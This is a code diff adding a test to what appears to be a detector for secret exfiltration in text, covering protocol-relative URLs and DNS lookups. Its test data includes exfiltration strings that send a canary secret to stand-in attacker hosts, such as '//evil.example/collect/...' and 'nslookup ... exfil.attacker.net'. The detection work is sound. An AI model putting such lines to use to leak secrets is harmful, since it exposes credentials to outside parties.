@@ -124,6 +124,17 @@ def test_find_exfil_over_dns():
     assert find_exfil(f"nslookup {key_canary()}.exfil.attacker.net", s) is None  # a different secret is not this exfil
 
 
+def test_find_exfil_over_scheme_relative_url():
+    # A protocol-relative URL (`//host/path`) is followed with the page's scheme, so it exfiltrates like an absolute URL
+    # but carries no http(s):// — caught as the "scheme-relative" channel, canary-gated so a bare //host is never a FP.
+    c = "K7QM-2XPA-3RTD-H4WB"
+    hit = find_exfil(f"leak via //evil.example/collect/{c}.png", c)
+    assert hit is not None and hit.channel == "scheme-relative" and c in hit.host
+    assert find_exfil("see //evil.example/home and //cdn.example/lib.js", c) is None   # no secret -> no hit
+    # the lookbehind keeps it from double-firing inside an https:// the `bare` channel already owns
+    assert {ch for ch, u in find_urls(f"https://ok.example/{c}")} == {"bare"}
+
+
 def test_find_urls_bounded():
     assert len(find_urls(" ".join(f"https://h{i}.example" for i in range(500)))) == canary.MAX_URLS
 
